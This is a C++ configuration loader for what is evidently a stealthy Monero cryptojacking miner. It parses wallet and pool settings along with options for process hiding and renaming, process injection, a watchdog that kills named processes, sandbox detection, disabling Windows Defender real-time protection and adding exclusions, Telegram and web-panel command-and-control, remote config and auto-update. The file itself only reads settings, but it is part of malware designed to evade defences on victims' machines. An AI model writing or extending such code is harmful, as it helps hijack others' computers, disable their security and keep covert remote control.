#include "../../include/utils/config.h"
#include <fstream>
#include <iostream>
#include <atomic>
#include <cstdint>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <functional>
#include <stdexcept>
#include <map>


namespace XMR {

Config Config::load_from_file(const std::string &path) {
  std::ifstream f(path);
  if (!f.is_open())
    throw std::runtime_error("Cannot open config file");
  nlohmann::json j;
  f >> j;
  return from_json(j);
}

Config Config::from_json(const nlohmann::json &j) {
  Config cfg;

  // Wallet & pools
  if (j.contains("wallet"))
    cfg.network.wallet = j["wallet"];
  if (j.contains("password"))
    cfg.network.password = j["password"];
  if (j.contains("pools") && j["pools"].is_array()) {
    for (auto &pool : j["pools"]) {
      if (pool.contains("url")) {
        std::map<std::string, std::string> p;
        p["url"] = pool["url"];
        if (pool.contains("priority"))
          p["priority"] = std::to_string(pool["priority"].get<int>());
        if (pool.contains("location"))
          p["location"] = pool["location"];
        cfg.network.pools.push_back(p);
      }
    }
  }

  // Mining
  if (j.contains("mining")) {
    auto &m = j["mining"];
    if (m.contains("max_threads"))
      cfg.mining.max_threads = m["max_threads"];
    if (m.contains("reserved_cores"))
      cfg.mining.reserved_cores = m["reserved_cores"];
    if (m.contains("max_cpu_usage"))
      cfg.mining.max_cpu_usage = m["max_cpu_usage"];
    if (m.contains("randomx")) {
      auto &rx = m["randomx"];
      if (rx.contains("enabled"))
        cfg.mining.randomx.enabled = rx["enabled"];
      if (rx.contains("huge_pages"))
        cfg.mining.randomx.huge_pages = rx["huge_pages"];
      if (rx.contains("jit"))
        cfg.mining.randomx.jit = rx["jit"];
      if (rx.contains("avx512"))
        cfg.mining.randomx.avx512 = rx["avx512"];
      if (rx.contains("cache_size_mb"))
        cfg.mining.randomx.cache_size_mb = rx["cache_size_mb"];
    }
    if (m.contains("gpu")) {
      auto &gpu = m["gpu"];
      if (gpu.contains("enabled"))
        cfg.mining.gpu.enabled = gpu["enabled"];
      if (gpu.contains("platform"))
        cfg.mining.gpu.platform = gpu["platform"];
      if (gpu.contains("device_id"))
        cfg.mining.gpu.device_id = gpu["device_id"];
      if (gpu.contains("threads_per_block"))
        cfg.mining.gpu.threads_per_block = gpu["threads_per_block"];
    }
  }

  // Network
  if (j.contains("network")) {
    auto &n = j["network"];
    if (n.contains("connection_timeout"))
      cfg.network.connection_timeout = n["connection_timeout"];
    if (n.contains("read_timeout"))
      cfg.network.read_timeout = n["read_timeout"];
    if (n.contains("reconnect_delay"))
      cfg.network.reconnect_delay = n["reconnect_delay"];
    if (n.contains("user_agent"))
      cfg.network.user_agent = n["user_agent"];
    if (n.contains("ssl")) {
      auto &ssl = n["ssl"];
      if (ssl.contains("enabled"))
        cfg.network.ssl.enabled = ssl["enabled"];
      if (ssl.contains("verify_certificate"))
        cfg.network.ssl.verify_certificate = ssl["verify_certificate"];
    }
    if (n.contains("tor")) {
      auto &tor = n["tor"];
      if (tor.contains("enabled"))
        cfg.network.tor.enabled = tor["enabled"];
      if (tor.contains("socks5_host"))
        cfg.network.tor.socks5_host = tor["socks5_host"];
      if (tor.contains("socks5_port"))
        cfg.network.tor.socks5_port = tor["socks5_port"];
    }
  }

  // Stealth
  if (j.contains("stealth")) {
    auto &s = j["stealth"];
    if (s.contains("hide_process"))
      cfg.stealth.hide_process = s["hide_process"];
    if (s.contains("process_names"))
      cfg.stealth.process_names =
          s["process_names"].get<std::vector<std::string>>();
    if (s.contains("rename_interval_seconds"))
      cfg.stealth.rename_interval_seconds = s["rename_interval_seconds"];
    if (s.contains("process_injection")) {
      auto &inj = s["process_injection"];
      if (inj.contains("enabled"))
        cfg.stealth.process_injection.enabled = inj["enabled"];
      if (inj.contains("target"))
        cfg.stealth.process_injection.target = inj["target"];
      if (inj.contains("method"))
        cfg.stealth.process_injection.method = inj["method"];
    }
    if (s.contains("watchdog")) {
      auto &wd = s["watchdog"];
      if (wd.contains("enabled"))
        cfg.stealth.watchdog.enabled = wd["enabled"];
      if (wd.contains("check_interval"))
        cfg.stealth.watchdog.check_interval = wd["check_interval"];
      if (wd.contains("kill_processes"))
        cfg.stealth.watchdog.kill_processes =
            wd["kill_processes"].get<std::vector<std::string>>();
      if (wd.contains("pause_on_detection"))
        cfg.stealth.watchdog.pause_on_detection = wd["pause_on_detection"];
    }
    if (s.contains("idle_detection"))
      cfg.stealth.idle_detection = s["idle_detection"];
    if (s.contains("idle_threshold_seconds"))
      cfg.stealth.idle_threshold_seconds = s["idle_threshold_seconds"];
    if (s.contains("defender_bypass")) {
      auto &db = s["defender_bypass"];
      if (db.contains("enabled"))
        cfg.stealth.defender_bypass.enabled = db["enabled"];
      if (db.contains("add_exclusion"))
        cfg.stealth.defender_bypass.add_exclusion = db["add_exclusion"];
      if (db.contains("disable_realtime"))
        cfg.stealth.defender_bypass.disable_realtime = db["disable_realtime"];
    }
    if (s.contains("sandbox_detection"))
      cfg.stealth.sandbox_detection = s["sandbox_detection"];
    if (s.contains("sandbox_exit"))
      cfg.stealth.sandbox_exit = s["sandbox_exit"];
  }

  // Remote config
  if (j.contains("remote_config")) {
    auto &r = j["remote_config"];
    if (r.contains("enabled"))
      cfg.remote_config.enabled = r["enabled"];
    if (r.contains("url"))
      cfg.remote_config.url = r["url"];
    if (r.contains("auth_token"))
      cfg.remote_config.auth_token = r["auth_token"];
    if (r.contains("update_interval"))
      cfg.remote_config.update_interval = r["update_interval"];
  }

  // C2
  if (j.contains("c2")) {
    auto &c2 = j["c2"];
    if (c2.contains("telegram")) {
      auto &tg = c2["telegram"];
      if (tg.contains("enabled"))
        cfg.c2.telegram.enabled = tg["enabled"];
      if (tg.contains("bot_token"))
        cfg.c2.telegram.bot_token = tg["bot_token"];
      if (tg.contains("chat_id"))
        cfg.c2.telegram.chat_id = tg["chat_id"];
    }
    if (c2.contains("web_panel")) {
      auto &wp = c2["web_panel"];
      if (wp.contains("enabled"))
        cfg.c2.web_panel.enabled = wp["enabled"];
      if (wp.contains("url"))
        cfg.c2.web_panel.url = wp["url"];
      if (wp.contains("api_key"))
        cfg.c2.web_panel.api_key = wp["api_key"];
    }
  }

  // Advanced
  if (j.contains("advanced")) {
    auto &a = j["advanced"];
    if (a.contains("log_file"))
      cfg.advanced.log_file = a["log_file"];
    if (a.contains("stats_report_interval"))
      cfg.advanced.stats_report_interval = a["stats_report_interval"];
    if (a.contains("auto_update"))
      cfg.advanced.auto_update = a["auto_update"];
    if (a.contains("update_url"))
      cfg.advanced.update_url = a["update_url"];
  }

  return cfg;
}

bool Config::validate() const {
  if (network.wallet.empty())
    return false;
  if (network.pools.empty())
    return false;
  if (mining.max_threads < 0)
    return false;
  return true;
}

void Config::save_to_file(const std::string &path) {
  // Not needed for now
}

} // namespace XMR
